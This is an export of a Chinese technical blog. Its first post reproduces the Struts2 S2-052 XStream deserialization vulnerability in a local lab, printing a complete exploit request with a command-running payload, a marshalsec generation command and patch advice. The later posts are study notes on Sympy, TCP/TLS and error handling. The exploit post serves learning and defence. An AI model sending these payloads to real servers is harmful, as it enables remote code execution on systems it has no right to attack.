    <content><![CDATA[<h2 id="原文链接-nMask"><a href="#原文链接-nMask" class="headerlink" title="原文链接 nMask"></a><a class="link"   href="https://thief.one/2017/09/06/1/" >原文链接 nMask<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</p>
<h3 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h3><p>s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。 漏洞编号：CVE-2017-9805（S2-052） 漏洞影响：Struts2.5 – Struts2.5.12版本。</p>
<h4 id="S2-052poc"><a href="#S2-052poc" class="headerlink" title="S2-052poc"></a><strong>S2-052poc</strong></h4><pre><code>POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 2365
Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1
&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
                      &lt;command&gt;
                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
                      &lt;/command&gt;
                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                    &lt;method&gt;
                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                      &lt;name&gt;start&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
              &lt;ibuffer&gt;&lt;/ibuffer&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
</code></pre>
<p>注意：执行命令的地方在于command内，这里是针对mac下的弹出计算器，如果是windows可改成calc.exe</p>
<pre><code>&lt;command&gt;
&lt;string&gt;
/Applications/Calculator.app/Contents/MacOS/Calculator
&lt;/string&gt;
&lt;/command&gt;
</code></pre>
<h4 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h4><p>mac install tomcat 在安装tomcat前，先检测一下mac上有没有安装java，可以运行java -version。</p>
<pre><code>java version &quot;1.8.0_111&quot;
Java(TM) SE Runtime Environment (build 1.8.0_111-b14)
Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode)
</code></pre>
<p>前往tomcat官网下载：<a class="link"   href="http://tomcat.apache.org/download-80.cgi?from_33lc.com" >http://tomcat.apache.org/download-80.cgi?from_33lc.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 选择下载Core下的tar.gz包到本地，然后解压。 将解压后到文件夹移动到&#x2F;Library目录下,并命名为Tomcat；然后设置权限：</p>
<pre><code>sudo chmod 755 /Library/Tomcat/bin/*.sh
</code></pre>
<p>进入&#x2F;Library&#x2F;Tomcat&#x2F;bin&#x2F;目录，运行启动tomcat</p>
<pre><code>sudo sh startup.sh
</code></pre>
<p>访问：<a class="link"   href="http://127.0.0.1:8080/" >http://127.0.0.1:8080<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 注意：若要修改tomcat端口，可打开&#x2F;Library&#x2F;Tomcat&#x2F;conf&#x2F;server.xml文件，修改8080端口。 编写启动关闭tomcat脚本： 将以下内容写入tomcat文件中（自己创建）</p>
<pre><code>#!/bin/bash
case $1 in
start)
sh /Library/Tomcat/bin/startup.sh
;;
stop)
sh /Library/Tomcat/bin/shutdown.sh
;;
restart)
sh /Library/Tomcat/bin/shutdown.sh
sh /Library/Tomcat/bin/startup.sh
;;
*)
echo “Usage: start|stop|restart”
;;
esac
exit 0
</code></pre>
<p>赋予文件权限：</p>
<pre><code>chmod 777 tomcat
</code></pre>
<p>添加环境变量：</p>
<pre><code>export PATH=&quot;$PATH:/Library/Tomcat/bin&quot;
</code></pre>
<p>然后运行启动关闭tomcat：</p>
<pre><code>sudo tomcat start
sudo tomcat stop
</code></pre>
<p>注：linux、windows安装tomcat方法都与之类似，这里不再演示。</p>
<h4 id="下载部署存在漏洞的struts2版本"><a href="#下载部署存在漏洞的struts2版本" class="headerlink" title="下载部署存在漏洞的struts2版本"></a><strong>下载部署存在漏洞的struts2版本</strong></h4><p>从struts2的官网下载最后受影响的版本struts-2.5.12解压后，将apps目录下的struts2-rest-showcase.war文件放到webapps目录下（&#x2F;Library&#x2F;Tomcat&#x2F;webapps）重启tomcat后访问：<a class="link"   href="http://127.0.0.1:8080/struts2-rest-showcase/" >http://127.0.0.1:8080/struts2-rest-showcase/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://trickmaster.cn/wp-content/uploads/2017/09/1.jpg"
                      alt="resume"
                > 由于burpsuite监控的端口也是8080，所以我将tomcat的端口改成8081了。 <strong>构造post包</strong> 可以直接使用上面的poc发包，也可以自己抓取数据包重放，自己抓取的方式是点击页面上的编辑，然后点击submit提交，抓取post包，再修改post的body字段为此漏洞的poc。 <strong>尝试不同的poc</strong> 网上使用最多的poc是弹出一个计算器，然而我在mac上测试发现弹出计算器失败了，因此换了一个写文件的poc，发现测试成功。 写文件poc：（会在&#x2F;tmp&#x2F;下生成vuln文件）</p>
<pre><code>&lt;command&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/command&gt;
</code></pre>
<p>弹计算器poc</p>
<pre><code>Mac:
&lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;
windows:
&lt;command&gt;&lt;string&gt;clac.exe&lt;/string&gt;&lt;/command&gt;
</code></pre>
<p><strong>poc生成</strong></p>
<pre><code>java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc.exe &gt; poc.txt
</code></pre>
<p>marshalsec-0.0.1-SNAPSHOT-all.jar网上可以下载，这里不给出地址了，自行搜索。</p>
<h4 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a><strong>修补方法</strong></h4><ul>
<li>升级Struts到2.5.13最新版本。</li>
<li>在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs</li>
</ul>
<p>python验证脚本 <a class="link"   href="https://github.com/ReZeroS/Security/blob/master/S2-052Check.py" >https://github.com/ReZeroS/Security/blob/master/S2-052Check.py<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>Sympy 解方程</title>
    <url>/2017/02/08/sympy/</url>
    <content><![CDATA[<ol>
<li><p>解普通方程</p>
<pre><code>from sympy import *
x = Symbol(&#39;x&#39;)
y = Symbol(&#39;y&#39;)
print solve([2 * x - y - 3, 3 * x + y - 7],[x, y])
</code></pre>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170208213138869?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="test"
                ></p>
<hr>
</li>
<li><p>解微积分<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170208213813012?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="微积分"
                ></p>
<pre><code>from sympy import *
n = Symbol(&#39;n&#39;)
s = ((n+3)/(n+2))**n

#无穷为两个小写o

print limit(s, x, oo)
</code></pre>
</li>
<li><p>求定积分<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170208214811814?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="定积分"
                ></p>
<pre><code>from sympy import *
t = Symbol(&#39;t&#39;)
x = Symbol(&#39;x&#39;)
m = integrate(sin(t)/(pi-t),(t,0,x))
n = integrate(m,(x,0,pi))
print n
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170208214938127?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="这里写图片描述"
                ></p>
</li>
<li><p>解微分方程</p>
<pre><code>#y&#39; = 2xy  的通解

from sympy import *
f = Function(&#39;f&#39;)
x = Symbol(&#39;x&#39;)
print dsolve(diff(f(x),x) - 2*f(x)*x,f(x))


#说明：

f = Function(&#39;f&#39;)
x = Symbol(&#39;x&#39;)

#表示f(x)的导：

diff(f(x), x, index)    
&gt;&gt;&gt; diff(sin(x), x, 1)
cos(x)

dsolve(eq, f(x))
    #第一个参数为微分方程（要先将等式移项为右端为0的形式)
    #第二个参数为要解的函数(在微分方程中)
</code></pre>
</li>
<li><p>矩阵化简 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170208223647728?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="这里写图片描述"
                ></p>
<pre><code>from sympy import *
x1,x2,x3 = symbols(&#39;x1 x2 x3&#39;)
a11,a12,a13,a22,a23,a33 = symbols(&#39;a11 a12 a13 a22 a23 a33&#39;)
m = Matrix([[x1,x2,x3]])
n = Matrix([[a11,a12,a13],[a12,a22,a23],[a13,a23,a33]])
v = Matrix([[x1],[x2],[x3]])
f = m * n * v
f[0] 化简， subs代入计算
print f[0].subs(&#123;x1:1, x2:1, x3:1&#125;)
</code></pre>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>symbol</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP</title>
    <url>/2020/08/09/tcp/</url>
    <content><![CDATA[<h2 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h2><h3 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h3><blockquote>
<p>注意网络状态的变化</p>
</blockquote>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">syn_sent -&gt;   established   -&gt; fin_wait1 -&gt;  fin_wait2 -&gt; time_wait &gt; closed</span><br><span class="line">listen -&gt; syn_rcvd -&gt; established -&gt; closed_wait -&gt; last_ack =======&gt; closed</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/09/tcp/tcp-status.png"
                      class="" title="tcp-network-status"
                >    


<h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><ol>
<li>SYN 失败</li>
</ol>
<p><code>RTO变化：2**(cat /proc/sys/net/ipv4/tcp_syn_retries[即重传次数上限])</code></p>
<ol start="2">
<li>SYN-ACK 失败</li>
</ol>
<p><code>cat /proc/sys/net/ipv4/tcp_synack_retries</code></p>
<ol start="3">
<li>ACK 失败：此时 服务端 syn-ack 重传已经到达最大次数，而客户端仍保持 established 状态</li>
</ol>
<p>如果客户端不发数据，则依靠 <strong>保活机制</strong> 进行排除死链接</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">net.ipv4.tcp_keepalive_time=7200 保活时间:即两小时内无活动则启用保活机制</span><br><span class="line">net.ipv4.tcp_keepalive_intvl=75  保活探测的时间间隔</span><br><span class="line">net.ipv4.tcp_keepalive_probes=9 保活探测的次数</span><br></pre></td></tr></table></figure></div>

<p>如果客户端发数据，重试多次后失败则断开由下面参数指定</p>
<p><code>cat /proc/sys/net/ipv4/tcp_retries2</code></p>
<h5 id="FAST-OPEN"><a href="#FAST-OPEN" class="headerlink" title="FAST OPEN"></a>FAST OPEN</h5><ul>
<li><p>在第一次建立连接的时候，服务端在第二次握手产生一个 Cookie （已加密）并通过 SYN、ACK 包一起发给客户端，于是客户端就会缓存这个 Cookie，所以第一次发起 HTTP Get 请求的时候，还是需要 2 个 RTT 的时延；</p>
</li>
<li><p>在下次请求的时候，客户端在 SYN 包带上 Cookie 发给服务端，就提前可以跳过三次握手的过程，因为 Cookie 中维护了一些信息，服务端可以从 Cookie 获取 TCP 相关的信息，这时发起的 HTTP GET请求就只需要 1 个 RTT 的时延；</p>
</li>
</ul>
<p><code>net.ipv4.tcp_fastopn # 0 关闭 1 作为客户端 2 作为服务端 3 作为客服 </code></p>
<h5 id="重复确认和快速重传"><a href="#重复确认和快速重传" class="headerlink" title="重复确认和快速重传"></a>重复确认和快速重传</h5><p>当接收方收到乱序数据包时，会发送重复的 ACK，以使告知发送方要重发该数据包，当发送方收到 3 个重复 ACK 时，就会触发快速重传，立该重发丢失数据包。</p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/jTDU-zxP1INTYLpGLypjXQ" >https://mp.weixin.qq.com/s/jTDU-zxP1INTYLpGLypjXQ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h5 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h5><p><a class="link"   href="https://mp.weixin.qq.com/s/HjOUsKn8eLfDogbBX3hPnA" >https://mp.weixin.qq.com/s/HjOUsKn8eLfDogbBX3hPnA<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h5 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h5><h5 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h5><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><h3 id="TCP-copy"><a href="#TCP-copy" class="headerlink" title="TCP copy"></a>TCP copy</h3><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p><a class="link"   href="https://cloud.tencent.com/developer/article/1683580?fromSource=gwzcw.1293314.1293314.1293314&cps_key=ad1dd5b36e1c498308f7302ab4cdabb7" >https://cloud.tencent.com/developer/article/1683580?fromSource=gwzcw.1293314.1293314.1293314&amp;cps_key=ad1dd5b36e1c498308f7302ab4cdabb7<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="SSL-x2F-TLS-的握手过程"><a href="#SSL-x2F-TLS-的握手过程" class="headerlink" title="SSL&#x2F;TLS 的握手过程"></a>SSL&#x2F;TLS 的握手过程</h4>    

<ol>
<li><p>在进行通信前，首先会进行 HTTP 的三次握手，握手完成后，再进行 TLS 的握手过程</p>
</li>
<li><p>ClientHello：客户端通过向服务器发送 hello 消息来发起握手过程。这个消息中会夹带着客户端支持的 TLS 版本号(TLS1.0 、TLS1.2、TLS1.3) 、客户端支持的密码套件、以及一串 客户端随机数。</p>
</li>
<li><p>ServerHello：在客户端发送 hello 消息后，服务器会发送一条消息，这条消息包含了服务器的 SSL 证书、服务器选择的密码套件和服务器生成的随机数。</p>
</li>
<li><p>认证(Authentication)：客户端的证书颁发机构会认证 SSL 证书，然后发送 Certificate 报文，报文中包含公开密钥证书。最后服务器发送 ServerHelloDone 作为 hello请求的响应。第一部分握手阶段结束。</p>
</li>
<li><p>加密阶段：在第一个阶段握手完成后，客户端会发送 ClientKeyExchange 作为响应，这个响应中包含了一种称为 The premaster secret<br> 的密钥字符串，这个字符串就是使用上面公开密钥证书进行加密的字符串。随后客户端会发送 ChangeCipherSpec，告诉服务端使用私钥解密这个 premaster secret 的字符串，然后客户端发送 Finished 告诉服务端自己发送完成了</p>
</li>
<li><p>实现了安全的非对称加密：然后，服务器再发送 ChangeCipherSpec 和 Finished 告诉客户端解密完成，至此实现了 RSA 的非对称加密。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>TCP</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Think More</title>
    <url>/2020/09/23/think-more/</url>
    <content><![CDATA[<h1 id="Think-More"><a href="#Think-More" class="headerlink" title="Think More"></a>Think More</h1><p><a class="link"   href="https://time.geekbang.org/column/intro/48" >https://time.geekbang.org/column/intro/48<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="错误码的处理"><a href="#错误码的处理" class="headerlink" title="错误码的处理"></a>错误码的处理</h2><h3 id="常见设计"><a href="#常见设计" class="headerlink" title="常见设计"></a>常见设计</h3><ol>
<li><p><code>C</code> 的 <code>errno</code> 是记录系统的最后一次错误代码</p>
<ul>
<li>错误具有歧义性，比如 <code>0</code> 不能区分是不是真的出错还是的确返回值就是 <code>0</code></li>
<li>错误不够显式，常常忘记检查</li>
</ul>
</li>
<li><p>Win 的 <code>HRESULT</code> </p>
<ul>
<li>错误变成了出参，导致接口变得不够纯净</li>
<li>仍然错误不够显式</li>
</ul>
</li>
<li><p>Go 的处理：函数的返回值附带一个 <code>error</code> 作为异常返回，当出现异常时其不为 nil</p>
<ul>
<li>是接口类型，只包含了一个字符串做描述，因此可以自己做实现</li>
<li>Go 的设计者觉得 try&#x2F;catch 机制的使用太泛滥了，而且从底层向更高的层级抛异常太耗费资源。他们给 Go 设计的机制也可以 “捕捉” 异常，但是更轻量，并且只应该作为（处理错误的）最后的手段</li>
<li>这样带来的问题就是无穷多的 <code>if err.(switchError)</code></li>
</ul>
</li>
</ol>
<h3 id="资源清理"><a href="#资源清理" class="headerlink" title="资源清理"></a>资源清理</h3><ol>
<li><p>传统清理使用 <code>goto</code></p>
<ul>
<li>弊端就是万一中间不小心 return 了就凉凉 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( fname == <span class="literal">NULL</span> )&#123;    </span><br><span class="line">    <span class="keyword">goto</span> fail;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ( lname == <span class="literal">NULL</span> )&#123;      </span><br><span class="line">    <span class="keyword">goto</span> fail;  </span><br><span class="line">&#125; </span><br><span class="line">......  </span><br><span class="line">fail:  FREE(fname);  FREE(lname);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>C++ 的构造申请资源析构释放资源（相当舒服）</p>
</li>
<li><p>Go 的 defer：defer后面的表达式会被放入一个列表中，在当前方法返回的时候，列表中的表达式就会被执行。</p>
</li>
</ol>
<p>感觉 defer 更灵活些，C++ 还需要额外的创建封装</p>
<h3 id="异常捕获处理"><a href="#异常捕获处理" class="headerlink" title="异常捕获处理"></a>异常捕获处理</h3><p>try-catch-finally 是最好的处理模式，个人感觉这像是一种 <code>switch-goto</code>，之前在做导入的时候需要做大量的校验。<br>但最终其实都要返回统一的异常，在遇到那种严重影响到后续校验的逻辑时个人感觉应该抛出而不是做进一步的猜测空指针的空指针。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>首先异常可以自由扩展借助多态</li>
<li>其次必须Get到所有的异常，即便是Catch后不处理，那也是显式Get到了异常</li>
<li>与返回码相比，有着嵌套调用与链式调用的优势：耗子叔这里的意思好像是因为返回码需要接到之后处理再返回</li>
<li>如果是上面说的这个意思，那错误码的一般解决方式就是前面提到的连接中使用 wrapper 作为入参来处理的</li>
</ul>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul>
<li>异常抛出函数直接return需要清理上下文（栈跟踪，记录哪行抛的异常，调用信息等），开销大</li>
<li>异步问题，线程抛出异常无法被调用线程捕获到</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
<p>对于我们并不期望会发生的事，我们可以使用异常捕捉：比如系统调用出错切换调用方式时判定</p>
<p>对于我们觉得可能会发生的事，使用返回码：比如状态码 404</p>
</blockquote>
<h3 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h3><ol>
<li><p>回调函数： 回调地狱</p>
</li>
<li><p>Promise 模式</p>
 <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">doSomething</span>()</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> <span class="title function_">doSomethingElse</span>(result))</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">finalResult</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Got the final result: <span class="subst">$&#123;finalResult&#125;</span>`</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(failureCallback); </span><br></pre></td></tr></table></figure></div>
<ul>
<li>java 中的 CompletableFuture</li>
</ul>
</li>
<li><p>async 和 await</p>
<ul>
<li>async 变成异步，不会阻塞主线程，await变同步，等待返回结果</li>
<li>这样就可以继续使用 try catch了</li>
</ul>
 <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title function_">doSomething</span>();</span><br><span class="line">    <span class="keyword">let</span> finalResult = <span class="keyword">await</span> <span class="title function_">doThirdThing</span>(newResult);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Got the final result: <span class="subst">$&#123;finalResult&#125;</span>`</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">    <span class="title function_">failureCallback</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="大结"><a href="#大结" class="headerlink" title="大结"></a>大结</h3><ol>
<li>统一分类的错误字典  404 502</li>
<li>同类错误的定义最好是可以扩展的 接口 多态</li>
<li>定义错误的严重程度 debug info</li>
<li>错误日志的输出最好使用错误码，而不是错误信息 PageNotFound Instead Of 404</li>
<li>处理错误时，总是要清理已分配的资源</li>
<li>向上尽可能地返回原始的错误</li>
<li>忽略错误最好有日志</li>
<li>对于同一个地方不停的报错，最好不要都打到日志里</li>
<li>不要用错误处理逻辑来处理业务逻辑 业务逻辑应该用 if else</li>
<li>对于同类的错误处理，用一样的模式</li>
<li>尽可能在错误发生的地方处理错误</li>
<li>向上尽可能地返回原始的错误</li>
<li>处理错误时，总是要清理已分配的资源</li>
<li>不推荐在循环体里处理错误</li>
<li>不要把大量的代码都放在一个 try 语句块内</li>
<li>为你的错误定义提供清楚的文档以及每种错误的代码示例</li>
<li>对于异步的方式，推荐使用 Promise 模式处理错误</li>
<li>对于分布式的系统，推荐使用 APM 相关的软件 尤其是使用 Zipkin 这样的服务调用跟踪的分析来关联错误。</li>
</ol>
<h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> <span class="title function_">Q_rsqrt</span><span class="params">( <span class="type">float</span> number )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">float</span> x2, y;</span><br><span class="line">    <span class="type">const</span> <span class="type">float</span> threehalfs = <span class="number">1.5F</span>;</span><br><span class="line"></span><br><span class="line">    y  = number;</span><br><span class="line">    这行代码就是把一个浮点数的 <span class="number">32b</span>its 的二进制转成整型。</span><br><span class="line">    也就是，前面我们例子里说过的，<span class="number">3.14</span> 的 <span class="number">32b</span>its 的二进制是：<span class="number">01000000010010001111010111000011</span>，</span><br><span class="line">    整型是：<span class="number">1078523331</span>。即 y = <span class="number">3.14</span>，i = <span class="number">1078523331</span>。</span><br><span class="line">    i  = * ( <span class="type">long</span> * ) &amp;y; <span class="comment">// evil floating point bit level hacking</span></span><br><span class="line">    Y 约等于 R - X/<span class="number">2</span></span><br><span class="line">    R = <span class="number">0x5f3759df</span> 代入</span><br><span class="line">    <span class="comment">// 猜出的近似值</span></span><br><span class="line">    i  = <span class="number">0x5f3759df</span> - ( i &gt;&gt; <span class="number">1</span> );  <span class="comment">// what the fuck? </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 牛顿平方根逼近</span></span><br><span class="line">    x2 = number * <span class="number">0.5F</span>;</span><br><span class="line">    y  = * ( <span class="type">float</span> * ) &amp;i;</span><br><span class="line">    y  = y * ( threehalfs - ( x2 * y * y ) );  <span class="comment">// 1st iteration </span></span><br><span class="line">    <span class="comment">// 2nd iteration, this can be removed</span></span><br><span class="line">    <span class="comment">// y  = y * ( threehalfs - ( x2 * y * y ) ); </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/float-dia.png"
                      class="" title="float-diagram"
                >

<ul>
<li>第一段占 1bit，表示符号位。 <code>[0, 1]</code> 代称为 S（sign）。</li>
<li>第二段占 8bits，表示指数。 <code>[-127, 128]</code> 代称为 E（Exponent）。</li>
<li>第三段占 23bits，表示尾数。 <code>[0, 2^(23) - 1]</code> 代称为 M（Mantissa）。<ul>
<li>也就是说，把 2n 到 2n+1 分成了 8388608 个线段。而存储的 M 值，就是从 2n 到 x 要经过多少个段。这要计算一下，2n 到 x 的长度占 2n 到 2n+1 长度的比例是多少。</li>
</ul>
</li>
</ul>
<p>举例：3.14 </p>
<ul>
<li>S &#x3D; 0</li>
<li><ol start="2">
<li>2^1 &lt; 3.14 &lt;2^2。所以，n&#x3D;1， n+127 &#x3D; 128。所以，E&#x3D;128。</li>
</ol>
</li>
